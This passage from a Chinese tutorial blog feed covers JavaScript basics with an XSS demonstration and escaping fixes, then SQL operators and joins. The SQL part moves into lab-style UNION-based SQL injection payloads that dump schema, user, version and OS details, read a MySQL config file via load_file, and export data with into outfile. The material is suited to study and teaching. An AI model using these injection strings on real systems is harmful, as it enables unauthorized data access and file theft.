successful"></p><h3 id="JavaScript基本语法"><a href="#JavaScript基本语法" class="headerlink" title="JavaScript基本语法"></a>JavaScript基本语法</h3><ol><li><h4 id="用var来进行变量声明"><a href="#用var来进行变量声明" class="headerlink" title="用var来进行变量声明"></a>用var来进行变量声明</h4></li></ol><p>字符：var name=”Bill Gates”; var name=”Bill”+” Gates”;</p><p>数值：var x=5; var x=2+3;</p><p>日期：var myDate=new Date() ;</p><p>①var mycars=new Array();</p><p>mycars[0]=”BMW”; mycars[1]=“Audi”; mycars[2]=”Benz”;</p><p>②var mycars=new Array(“BMW”, “Audi”, “Benz”);</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">​     &lt;button onclick=&quot;test1()&quot;&gt;显示&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">​    function test1()&#123;</span><br><span class="line">​    var name=&quot;Bill&quot;+&quot; Gates&quot;; </span><br><span class="line">​    var x=2+3;</span><br><span class="line">​      var myDate=new Date();</span><br><span class="line">​      var mycars=new Array();</span><br><span class="line">​      mycars[0]=&quot;BMW&quot;; mycars[1]=&quot;Audi&quot;; mycars[2]=&quot;Benz&quot;;</span><br><span class="line">​      var mycars2=new Array(&quot;BMW&quot;, &quot;Audi&quot;, &quot;Benz&quot;);</span><br><span class="line">​      alert(name);</span><br><span class="line">​    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/17.png" alt="upload successful"></p><h4 id="2-If-语句"><a href="#2-If-语句" class="headerlink" title="2 . If 语句"></a>2 . If 语句</h4><p>if(条件){代码}</p><p>if(条件){代码}else{代码}</p><p>if(条件){代码}else if(条件){代码}else{代码}</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">​     text:&lt;input id=&quot;in&quot; type=&quot;text&quot;  /&gt;</span><br><span class="line">​     &lt;button onclick=&quot;test1()&quot;&gt;奇偶判断&lt;/button&gt;</span><br><span class="line">​     &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;p/&gt;</span><br><span class="line">  &lt;/div&gt; </span><br><span class="line">  &lt;script&gt;</span><br><span class="line">​    function test1()&#123;</span><br><span class="line">​    var val = document.getElementById(&quot;in&quot;).value;</span><br><span class="line">​    if(val === &quot;&quot; || val == null)&#123;</span><br><span class="line">​        document.getElementById(&quot;p&quot;).innerHTML = &quot;输入为空&quot;;</span><br><span class="line">​      &#125;else if(isNaN(val))&#123;</span><br><span class="line">​    document.getElementById(&quot;p&quot;).innerHTML = &quot;输入不是数字&quot;;</span><br><span class="line">​      &#125;else&#123;</span><br><span class="line">​      if(val%2 == 0)&#123;  </span><br><span class="line">​           document.getElementById(&quot;p&quot;).innerHTML = val+&quot;是偶数&quot;;</span><br><span class="line">​        &#125;else&#123;  </span><br><span class="line">​           document.getElementById(&quot;p&quot;).innerHTML = val+&quot;是奇数&quot;;</span><br><span class="line">​        &#125;  </span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/18.png" alt="upload successful"></p><h4 id="3-Switch-语句"><a href="#3-Switch-语句" class="headerlink" title="3 . Switch 语句"></a>3 . Switch 语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">switch(n) &#123;</span><br><span class="line">    case 1: 执行代码块 1</span><br><span class="line">​         break;</span><br><span class="line">​   case 2: 执行代码块 2</span><br><span class="line">​         break;</span><br><span class="line">​     default:</span><br><span class="line">​  都不满足时执行的代码</span><br><span class="line">​   &#125;</span><br></pre></td></tr></table></figure><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">​     text:&lt;input id=&quot;in&quot; type=&quot;date&quot;  /&gt;</span><br><span class="line">​     &lt;button onclick=&quot;test1()&quot;&gt;判断周末&lt;/button&gt;</span><br><span class="line">​     &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;p/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">​    function test1()&#123;</span><br><span class="line">​    var x = &quot;&quot;;</span><br><span class="line">​    var text = document.getElementById(&quot;in&quot;).value;</span><br><span class="line">​    var day = new Date(text).getDay();</span><br><span class="line">​      switch (day)&#123;</span><br><span class="line">​        case 0:</span><br><span class="line">​          x = text+&quot;是周末&quot;;</span><br><span class="line">​          break;</span><br><span class="line">​        case 6:</span><br><span class="line">​          x = text+&quot;是周末&quot;;</span><br><span class="line">​          break;</span><br><span class="line">​        default:</span><br><span class="line">​          x = text+&quot;不是周末&quot;;</span><br><span class="line">​      &#125;</span><br><span class="line">​      document.getElementById(&quot;p&quot;).innerHTML = x;</span><br><span class="line">​    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/19.png" alt="upload successful"></p><h4 id="4-for-循环（可以遍历元素）"><a href="#4-for-循环（可以遍历元素）" class="headerlink" title="4.for 循环（可以遍历元素）"></a>4.for 循环（可以遍历元素）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (语句 1; 语句 2; 语句 3) &#123;</span><br><span class="line">         被执行的代码块</span><br><span class="line">        &#125;</span><br><span class="line">       语句1 在循环开始之前设置变量 (如：var i=0)。</span><br><span class="line">       语句2 定义循环运行的条件（如：i &lt; 5）</span><br><span class="line">       语句3 在每次代码块已被执行后增加一个值 (如：i++)</span><br></pre></td></tr></table></figure><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">​     &lt;p&gt;我是第一段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第二段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第三段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第四段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第五段&lt;/p&gt;</span><br><span class="line">​     &lt;button onclick=&quot;test1()&quot;&gt;改变&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">​    function test1()&#123;</span><br><span class="line">​    var obj = document.getElementsByTagName(&quot;p&quot;);</span><br><span class="line">​    for (var i=0;i&lt;obj.length;i++)&#123;</span><br><span class="line">​         obj[i].innerHTML = &quot;我是第&quot;+(i+1)+&quot;段&quot;;</span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/20.png" alt="upload successful"></p><h4 id="5-while-循环"><a href="#5-while-循环" class="headerlink" title="5 . while 循环"></a>5 . while 循环</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while (条件) &#123;</span><br><span class="line">     需要执行的代码</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">​     &lt;p&gt;我是第一段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第二段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第三段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第四段&lt;/p&gt;</span><br><span class="line">​     &lt;p&gt;我是第五段&lt;/p&gt;</span><br><span class="line">​     &lt;button onclick=&quot;test1()&quot;&gt;改变&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">​    function test1()&#123;</span><br><span class="line">​    var obj = document.getElementsByTagName(&quot;p&quot;);</span><br><span class="line">​    var i = 0;</span><br><span class="line">​      while (i &lt; obj.length)&#123;</span><br><span class="line">​       obj[i].innerHTML = &quot;我是第&quot;+(i+1)+&quot;段&quot;;</span><br><span class="line">​         i++;</span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/21.png" alt="upload successful"></p><h3 id="JavaScript安全性"><a href="#JavaScript安全性" class="headerlink" title="JavaScript安全性"></a>JavaScript安全性</h3><h4 id="XSS攻击路径："><a href="#XSS攻击路径：" class="headerlink" title="XSS攻击路径："></a>XSS攻击路径：</h4><p><img src="/images/JavaScript/22.png" alt="upload successful"></p><h4 id="2-下面这个页面注入一个弹出框"><a href="#2-下面这个页面注入一个弹出框" class="headerlink" title="2 . 下面这个页面注入一个弹出框"></a>2 . 下面这个页面注入一个弹出框</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div&gt;</span><br><span class="line">​     text:&lt;input id=&quot;in&quot; type=&quot;text&quot;  /&gt;&lt;button onclick=&quot;test()&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">​     &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">​    function test()&#123;</span><br><span class="line">​      var a = document.getElementById(&quot;in&quot;).value;</span><br><span class="line">​      document.getElementById(&quot;p&quot;).innerHTML = a;</span><br><span class="line">​    &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果我们在输入框中输入：</p><p>​       你好</p><script>alert(“1”)</script><p></p><p>会形成一个带弹出框的页面。</p><h4 id="3-改变页面a标签的超链接"><a href="#3-改变页面a标签的超链接" class="headerlink" title="3 . 改变页面a标签的超链接"></a>3 . 改变页面a标签的超链接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div&gt;</span><br><span class="line">​     &lt;a id=&quot;a&quot; href=&quot;http://www.sina.com.cn&quot; target=&quot;_blank&quot;&gt;跳转到某门户网站&lt;/a&gt;</span><br><span class="line">​     &lt;br&gt;&lt;/&gt;text:&lt;input id=&quot;in&quot; type=&quot;text&quot;  /&gt;&lt;button onclick=&quot;test()&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">​     &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt; </span><br><span class="line">  &lt;script&gt;</span><br><span class="line">​    function test()&#123;</span><br><span class="line">​      var a = document.getElementById(&quot;in&quot;).value;</span><br><span class="line">​      document.getElementById(&quot;p&quot;).innerHTML = a;</span><br><span class="line">​    &#125;</span><br><span class="line">​    &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果我们在输入框中输入：</p><p>​       你好</p><script>document.getElementById(“a”).href =</p><p>​       “<a href="http://www.gooann.com&quot;;alert(&quot;我改变了链接&quot;)">http://www.gooann.com&quot;;alert(&quot;我改变了链接&quot;)</a></script><p></p><p>会形成一个改变链接地址的页面。</p><p><strong>产生问题的原因：带有HTML标签的输入被存储并反应到了页面上</strong></p><p><strong>解决方法：在使用用户输入、后台存储、以及页面反应时，</strong></p><p>​                 <strong>使用函数去掉HTML标签或转义字符</strong></p><p><strong>JavaScript: textContent、encodeURIComponent()</strong></p><p><strong>PHP: htmlspecialchars()、trim()、strip_tags()、addslashes()</strong></p><h4 id="5、JavaScript代码的安全性"><a href="#5、JavaScript代码的安全性" class="headerlink" title="5、JavaScript代码的安全性"></a>5、JavaScript代码的安全性</h4><p>textContent</p><p>​     不返回html文本，性能更好，安全性更高。返回纯文本，不带任何标签。</p><p>encodeURIComponent()</p><p>​      对字符串替换所有非字母数字字符，安全性提高</p><h4 id="6、PHP代码安全性"><a href="#6、PHP代码安全性" class="headerlink" title="6、PHP代码安全性"></a>6、PHP代码安全性</h4><p>htmlspecialchars()</p><p>​     把“ （双引号）、‘ （单引号）、&lt; （小于）、&gt; （大于）等转化为实体</p><p>trim(string,charlist)</p><p>​     去掉字符串两端预定义的字符，默认去掉</p><p>​         “\0”   (NULL)</p><p>​         “\t”     (制表符)</p><p>​         “\n”    (换行)</p><p>​         “\x0B” (垂直制表符)</p><p>​         “\r”      (回车)</p><p>​         “  “        (空格)</p><p><strong>strip_tags()</strong></p><p>​     从字符串中去除 HTML 和 PHP 标记</p><p><strong>addslashes(string)</strong></p><p>​      向字符串中的预定义字符添加反斜杠，默认</p><p>​          单引号（’）</p><p>​          双引号（”）</p><p>​          反斜杠（\）</p><p>​          NULL</p><h3 id="jQuery的介绍"><a href="#jQuery的介绍" class="headerlink" title="jQuery的介绍"></a>jQuery的介绍</h3><h4 id="1、引入jQuery文件"><a href="#1、引入jQuery文件" class="headerlink" title="1、引入jQuery文件"></a>1、引入jQuery文件</h4><p>在head中引入jQuery文件</p><p>​     <script type="text/javascript" src="jquery.js"></script></p><h4 id="2、jQuery元素选择器"><a href="#2、jQuery元素选择器" class="headerlink" title="2、jQuery元素选择器"></a>2、jQuery元素选择器</h4><p>id选择器：$(“#id”)</p><p>类选择器：$(“.class”)</p><p>元素选择器：$(“p”) </p><p>   ※获取内容：.text()、.html()、.val()</p><p>​    设置内容： .text(内容)、.html(内容)、.val(内容)</p><p>例题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=&quot;http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;p id=&quot;id1&quot; class=&quot;classp&quot;&gt;这是段落1&lt;/p&gt;</span><br><span class="line">  &lt;p id=&quot;id2&quot; class=&quot;classp&quot;&gt;这是段落2&lt;/p&gt;</span><br><span class="line">  &lt;p id=&quot;id3&quot; class=&quot;classp&quot;&gt;这是段落3&lt;/p&gt;</span><br><span class="line">  &lt;p id=&quot;id4&quot; class=&quot;classp&quot;&gt;这是段落4&lt;/p&gt;</span><br><span class="line">  &lt;p id=&quot;id5&quot; class=&quot;classp&quot;&gt;这是段落5&lt;/p&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; class=&quot;classin&quot;/&gt;</span><br><span class="line">  &lt;button onclick=&quot;test()&quot; &gt;button&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"> function test()&#123;</span><br><span class="line">  alert($(&quot;#id2&quot;).text());</span><br><span class="line">  $(&quot;p&quot;).each(function()&#123;</span><br><span class="line">​    alert($(this).text())</span><br><span class="line">  &#125;);</span><br><span class="line">  alert($(&quot;.classin&quot;).val());</span><br><span class="line"> &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/JavaScript/23.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;p&gt;JavaScript是脚本语言，又称为动态语言，是一种编程语言，用来控制软件应用程序，通常以文本保存，只在调用时调用进行编译。JavaScript 是可插入 HTML 页面的编程代码JavaScript 插入 HTML 页面后，可由所有的现代浏览器执行&lt;/p&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>SQL语句实操</title>
    <link href="http://yoursite.com/2018/08/22/SQL%E8%AF%AD%E5%8F%A5%E5%AE%9E%E6%93%8D/"/>
    <id>http://yoursite.com/2018/08/22/SQL语句实操/</id>
    <published>2018-08-22T14:52:00.000Z</published>
    <updated>2018-09-02T09:11:51.510Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>逻辑运算符：</strong></p><p>NOT 或 ！：逻辑非</p><p>AND 或 &amp;&amp;：逻辑与</p><a id="more"></a><p>OR 或 ||：逻辑或</p><p>XOR：逻辑异或</p><p><strong>1、逻辑非 ( NOT 或 ！)</strong></p><p>(1) 当操作数为 0 时，所得值为 1</p><p>(2) 当操作数为非 0 时，所得值为 0</p><p>(3) 当操作数为 NULL 时，所得值为 NULL</p><p>!T = F</p><p>!F = T</p><p><strong>2、逻辑与 ( AND 或 &amp;&amp; )</strong></p><p>(1) 当所有操作数均为非零值、并且不为 NULL 时，所得值为 1</p><p>(2) 当一个或多个操作数为 0 时，所得值为 0 </p><p>(3) 其余情况所得值为 NULL</p><p>T &amp;&amp; T = T</p><p>T &amp;&amp; F = F</p><p>F &amp;&amp; F = F</p><p><strong>3、逻辑或 ( OR 或 || )</strong></p><p>(1) 当两个操作数均为非 NULL 值，且任意一个操作数为非零值时，结果为 1 ，否则为 0</p><p>(2) 当有一个操作数为 NULL ，且另一个操作数为非零值时，则结果为 1 ，否则结果为 NULL</p><p>(3) 当两个操作数均为 NULL 时，则所得结果为 NULL</p><p>T || T = T</p><p>T || F = T</p><p>F || F = F</p><p><strong>4、逻辑异或</strong></p><p>(1) a XOR b 的计算等同于 ( a AND (NOT b) ) 或 ( (NOT a) AND b )</p><p>(2) 当任意一个操作数为 NULL 时，返回值为 NULL</p><p>(3) 对于非 NULL 的操作数，如果两个操作数都是非 0 值或者都是 0 值，则返回结果为 0</p><p>(4) 如果一个为 0 值，另一个为非 0 值，返回结果为 1</p><p>T XOR T = F</p><p>T XOR F = T</p><p>F XOR F = F</p><p><strong>5、逻辑运算符的优先级: 括号&gt;比较运算符&gt;非&gt;与&gt;或</strong></p><p>相同优先级的运算符由左向右依次执行</p><p>例:</p><p>1、Select 1=1 or 1=2 and 2=2 </p><p>2、Select （ 1=1 or 1=2 ) and 2=2</p><p>1、分解为</p><p>Select 1=2 and 2=2  结果为 0</p><p>Select 1=1 or 0 结果为1</p><p>2、分解为</p><p>Select 1=1 or 1=2  结果为 1</p><p>Select 1 and 2=2  结果为1</p><h4 id="表连接："><a href="#表连接：" class="headerlink" title="表连接："></a>表连接：</h4><p>当需要同时显示多个表中的字段时，就可以用表连接来实现，这样的功能。</p><p>从大类上分，表连接分为以下4类：</p><p><strong>【内连接】：仅选出两张表中互相匹配的记录</strong></p><p><strong>【左连接】：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录</strong></p><p><strong>【右连接】：包含所有的右边表中的记录甚至是左边表中没有和它匹配的记录</strong></p><p><strong>【外连接】：两边表中的内容全部显示</strong></p><h4 id="SQL连接（JOIN）"><a href="#SQL连接（JOIN）" class="headerlink" title="SQL连接（JOIN）"></a>SQL连接（JOIN）</h4><p>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p><p>最常见的 JOIN 类型：SQL INNER JOIN（简单的 JOIN）。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。</p><ul><li>INNER JOIN：如果表中有至少一个匹配，则返回行</li></ul><p><img src="/images/SQL/21.png" alt="upload successful"></p><p><strong>SQL INNER JOIN 语法</strong></p><p>SELECT column_name(s)</p><p>FROM table1</p><p>INNER JOIN table2</p><p>ON table1.column_name=table2.column_name;</p><p>select student.student_name,student.student_sex,grade.subject1,grade.grade1,grade.createtimestamp,grade.updatetimestamp</p><pre><code>-&gt; from student-&gt; inner join grade-&gt; on student.student_id=grade.student_id;</code></pre><p><img src="/images/SQL/22.png" alt="upload successful"></p><ul><li><strong>LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行</strong></li></ul><p><img src="/images/SQL/23.png" alt="upload successful"></p><h4 id="SQL-LEFT-JOIN-语法"><a href="#SQL-LEFT-JOIN-语法" class="headerlink" title="SQL LEFT JOIN 语法"></a>SQL LEFT JOIN 语法</h4><p>SELECT column_name(s)</p><p>FROM table1</p><p>LEFT JOIN table2</p><p>ON table1.column_name=table2.column_name;</p><ul><li><strong>RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行</strong></li></ul><p><img src="/images/SQL/24.png" alt="upload successful"></p><h4 id="SQL-RIGHT-JOIN-语法"><a href="#SQL-RIGHT-JOIN-语法" class="headerlink" title="SQL RIGHT JOIN 语法"></a>SQL RIGHT JOIN 语法</h4><p>SELECT column_name(s)</p><p>FROM table1</p><p>RIGHT JOIN table2</p><p>ON table1.column_name=table2.column_name;</p><ul><li><strong>FULL JOIN：只要其中一个表中存在匹配，则返回行</strong></li></ul><p><img src="/images/SQL/25.png" alt="upload successful"></p><p>SQL FULL OUTER JOIN 语法</p><p>SELECT column_name(s)</p><p>FROM table1</p><p>FULL OUTER JOIN table2</p><p>ON table1.column_name=table2.column_name;</p><h4 id="练习题："><a href="#练习题：" class="headerlink" title="练习题："></a>练习题：</h4><p>student表</p><p><img src="/images/SQL/26.png" alt="upload successful"></p><p>student_score表</p><p><img src="/images/SQL/27.png" alt="upload successful"></p><p><strong>1.插入一条学生学籍信息，及两条学生成绩信息。</strong></p><p>insert into student values(‘13’,’张三’,’男’,’福建’,’泉州’,null’,’23’,null);</p><p>insert into student_score values(‘10’,’Python入门’,’80.5’,’16’,null,null);</p><p>insert into student_score values(‘11’,’密码学基本原理’,’95.5’,’16’,null,null);</p><p><strong>2.查询目前都有哪些课程。</strong></p><p>select distinct lesson from student_score;   //distinct去除重复的课程</p><p><strong>3.查询学生姓名学了哪些课程，每门课程的成绩</strong></p><p>select student.student_name,student_score.lesson,student_score.score from student inner join student_score on student.student_id=student_score.student_id;</p><p><strong>4.查询某一课程最高分数的学生的姓名</strong></p><p>方法一：SELECT student_name,score,lesson from student,student_score where student_score.lesson=(‘WEB安全’) and student.student_id=student_score.student_id order by student_score.score desc LIMIT 1;</p><p>方法二：select a.student_name,b.score from student a,student_score b where a.student_id=b.student_id and b.score = (select max(score) from student_score where lesson = ‘SQL基本语法’) and lesson = ‘SQL基本语法’;</p><p><strong>5.查询所有学生学籍信息及某一科课程的课程名称、成绩、学时。</strong></p><p>select student.*,student_score.lesson,student_score.score,student_score.duration from student left join student_score on student.student_id=student_score.student_id;</p><p>（2）</p><p>select * from student where student_id = ‘$student_id’ </p><p><strong>以上SQL语句中，$student_id为变量，可以用字符串代替</strong></p><h4 id="要求"><a href="#要求" class="headerlink" title="要求:"></a>要求:</h4><p><strong>1.查询所有学生的信息</strong></p><p>select <em> from student where student_id = ‘1’ and 1=2 UNION select </em> from student– ‘</p><p><strong>2.查询表结构</strong></p><p>select * from information_schema.columns where TABLE_NAME=’student’;</p><p>select * from student where student_id = ‘’ UNION select COLUMN_NAME,DATA_TYPE,COLUMN_TYPE,COLUMN_DEFAULT,IS_NULLABLE,COLUMN_KEY,EXTRA,8 from information_schema.columns where TABLE_NAME=(‘student’) – ‘ ;</p><p><img src="/images/SQL/28.png" alt="upload successful"></p><p><strong>3.获取数据库信息</strong></p><p>select * from student where student_id = ‘ 1’ and 1=2 UNION SELECT 1,database(),user(),VERSION(),5,6,7,8 – ‘</p><p><img src="/images/SQL/29.png" alt="upload successful"></p><p><strong>4.获得操作系统信息</strong></p><p>select * from student where student_id = ‘’ UNION SELECT 1,@@global.version_compile_os,3,4,5,6,7,8 – ‘</p><p>或select * from student where student_id = ‘1’and 1=2 union select 1,2,3,4,5,6,7,@@global.version_compile_os from mysql.user ;</p><p><img src="/images/SQL/30.png" alt="upload successful"></p><p><strong>5.查看所有数据库名称</strong></p><p>select * from student where student_id = ‘’ UNION select 1,TABLE_NAME,3,4,5,6,7,8 from information_schema.columns – ‘</p><p><img src="/images/SQL/31.png" alt="upload successful"></p><h4 id="继续："><a href="#继续：" class="headerlink" title="继续："></a>继续：</h4><p><strong>1.用load_file读取文件 C:\Program Files\MySQL\MySQL Server 5.5\my.ini</strong></p><p>select * from student where student_id = ‘’ union select 1,1,1,1,load_file(‘C:\Program Files\MySQL\MySQL Server 5.5\my.ini’),2,3,4 – ‘</p><p><strong>2.将student表内容导出到文件当中</strong></p><p>select * from student into outfile (‘C:\Program Files\MySQL\MySQL Server 5.5\hyd.txt’) </p><p><strong>3.查询学生姓名及【SQL基本语法】成绩、并对成绩按照以下分类</strong></p><p>100-85 优</p><p>85-70 良</p><p>60-70 中</p><p>60以下 差</p><p>select 